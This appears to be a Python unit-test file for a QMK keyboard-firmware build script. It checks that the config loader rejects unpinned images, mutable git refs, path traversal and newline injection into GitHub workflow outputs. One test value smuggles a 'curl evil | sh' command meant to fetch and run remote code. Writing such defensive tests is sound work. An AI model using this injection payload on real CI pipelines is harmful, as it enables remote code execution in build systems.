"""keyballer.json is untrusted input to the build: its values reach $GITHUB_OUTPUT, container
images and git. load_config refuses anything that could inject or that can change silently."""

import json
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from build_qmk import ConfigError, load_config  # noqa: E402

SHA = "4664de991d14da34bd42e7031ac7406b6ccb02af"
DIGEST = "sha256:" + "2dc05fc9f32efebd6b05c2b8676ee548358bc7e151e9dbf4dac6b6eed4513b07"


def config(**changes):
    cfg = {
        "firmware": "qmk",
        "qmk": {"version": "0.22.14"},
        "sources": [{"repo": "Yowkees/keyball", "ref": SHA, "path": "qmk_firmware/keyboards/keyball", "as": "keyball"}],
        "builds": [{"id": "keyball39", "name": "Keyball39", "keyboard": "keyball/keyball39", "keymap": "am338", "keymap_dir": "keymaps/am338"}],
    }
    for key, value in changes.items():
        target, field = key.split("__") if "__" in key else (None, key)
        if target == "qmk":
            cfg["qmk"][field] = value
        elif target == "source":
            cfg["sources"][0][field] = value
        elif target == "build":
            cfg["builds"][0][field] = value
        else:
            cfg[field] = value
    return cfg


class LoadConfigTest(unittest.TestCase):
    def load(self, cfg):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp)
            (d / "keymaps" / "am338").mkdir(parents=True)
            (d / "keyballer.json").write_text(json.dumps(cfg))
            return load_config(d)

    def test_accepts_the_owner_config(self):
        self.load(config())
        self.load(config(qmk__image="ghcr.io/qmk/qmk_cli@" + DIGEST))
        self.load(config(qmk__image="ghcr.io/qmk/qmk_cli:1.2@" + DIGEST))

    def test_refuses_an_image_that_is_not_pinned_by_digest(self):
        for image in ["ghcr.io/qmk/qmk_cli:latest", "ghcr.io/qmk/qmk_cli", "x@sha256:abc"]:
            with self.assertRaises(ConfigError, msg=image):
                self.load(config(qmk__image=image))

    def test_refuses_values_that_could_add_lines_to_workflow_outputs(self):
        injected = "ghcr.io/x/qmk@" + DIGEST + '\nids=["x\' || curl evil | sh; : \'"]'
        with self.assertRaises(ConfigError):
            self.load(config(qmk__image=injected))
        with self.assertRaises(ConfigError):
            self.load(config(build__id="keyball39\n"))
        with self.assertRaises(ConfigError):
            self.load(config(qmk__version="0.22.14\nids=[]"))

    def test_refuses_sources_that_can_change_without_a_commit(self):
        for ref in ["main", "v1.0", SHA[:7], SHA + "\n"]:
            with self.assertRaises(ConfigError, msg=ref):
                self.load(config(source__ref=ref))

    def test_refuses_source_names_and_paths_that_leave_their_place(self):
        for key, value in [("repo", "a/b/c"), ("repo", "../x"), ("path", "../../etc"), ("path", "/abs"), ("as", "../keyball")]:
            with self.assertRaises(ConfigError, msg=(key, value)):
                self.load(config(**{"source__" + key: value}))


if __name__ == "__main__":
    unittest.main()
